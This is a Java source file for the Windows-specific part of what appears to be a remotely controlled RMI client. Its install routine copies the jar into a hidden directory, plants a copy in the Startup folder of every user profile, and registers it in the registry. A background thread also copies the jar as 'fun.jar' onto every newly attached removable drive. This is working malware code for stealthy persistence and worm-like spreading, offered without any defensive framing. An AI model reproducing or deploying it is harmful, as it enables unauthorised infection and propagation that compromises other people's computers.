package client.platformdependant;

import java.io.File;
import java.util.LinkedList;

import rmi.communication.Client;
import client.updating.AbstractClient;

public class WindowsDependant extends PlatformDependant {

	private WindowsDependant(){}
	private static WindowsDependant instance = null;
	
	public static WindowsDependant getWindowsInstance()
	{
		if (instance == null)
			instance = new WindowsDependant();
		return instance;
	}
	
	private static File currentPath()
	{
		return new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
	}
	
	public void install()
	{
		String fullpath = currentPath().toString();
		if (fullpath.contains(AbstractClient.clientName) || !fullpath.endsWith(".jar"))
		{
			System.out.println("Installation unnecessary");
			return;
		}
		else
			System.out.println("Installing...");
		String installationDir = System.getProperty("user.home")+'\\'+directoryName;
		File f = new File(installationDir);
		if (!f.exists())
		{
			f.mkdir();
			try
			{
				Runtime.getRuntime().exec("attrib +H " + installationDir);
			}
			catch(Exception e){
				System.err.println("Failed to set installation directory hidden: " + "attrib +H " + installationDir);
			}
		}
		//String path = getJarPath();
		f = new File(System.getProperty("user.home")+"/"+directoryName+"/"+AbstractClient.clientName);
		if (!f.exists())
			copyFile(fullpath,System.getProperty("user.home")+"/"+directoryName+"/"+AbstractClient.clientName);
		String temp = System.getProperty("user.home");
		int pos1 = temp.lastIndexOf('/');
		int pos2 = temp.lastIndexOf('\\');
		int pos = pos1 > pos2 ? pos1 : pos2;
		f = new File(temp.substring(0,pos));
		File [] fs = f.listFiles();
		File user;
		File instFile;
		for (File tmp : fs)
		{
			if (tmp.isDirectory())
			{
				try
				{
					user = new File(tmp.getAbsolutePath()+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
					if (!user.exists())
						user = new File (tmp.getAbsolutePath()+"\\Start Menu\\Programs\\Startup"); //for xp
					if (user.exists())
					{
						instFile = new File(user.getAbsolutePath()+'\\'+installerName);
						if (!instFile.exists())
							copyFile(fullpath,instFile.getAbsolutePath());
					}
				}
				catch(Exception e){}
			}
		}
		try
		{
			Emulator.installToRegistry();
		}
		catch(Exception e){e.printStackTrace();}
		//startCopy();
		System.exit(0);
	}
	
	private void startCopy()
	{
		try
		{
			Runtime.getRuntime().exec("java -jar " + System.getProperty("user.home")+"/"+directoryName+"/"+AbstractClient.clientName);
			System.out.println("Closing installer file");
			System.exit(0);
		}
		catch(Exception e)
		{
			System.err.println("Failed to run newly installed client");
		}
	}

	@Override
	public String getHomeDirectory() {
		return System.getProperty("user.home")+"\\"+directoryName;
	}

	@Override
	public void waitForRemovableDrives() {
		new Thread(new Runnable(){
			
			private static final int sleepTime = 10000;
			
			public void installOnDrive(File drive)
			{
				copyFile(currentPath().toString(), drive + "fun.jar");
			}
			
			public void run()
			{
				File [] last = null;
				File [] tmp;
				LinkedList<File>news = new LinkedList<File>();
				while (true)
				{
					if (last == null)
					{
						last = File.listRoots();
						try{
						Thread.sleep(sleepTime);
						}catch(Exception e){}
					}
					tmp = File.listRoots();
					news.clear();
					int i;
					for (File f : tmp)
					{
						for (i = 0; i<last.length; i++)
							if (f.equals(last[i]))
								break;
						if (i == last.length)
							news.add(f);
					}
					last = tmp;
					if (news.size() > 0)
					{
						System.out.println("New drive detected");
						for (File x : news)
							installOnDrive(x);
					}
					try
					{
						Thread.sleep(sleepTime);
					}
					catch(Exception e){}
				}
			}
			
		}).start();
	}
	
}
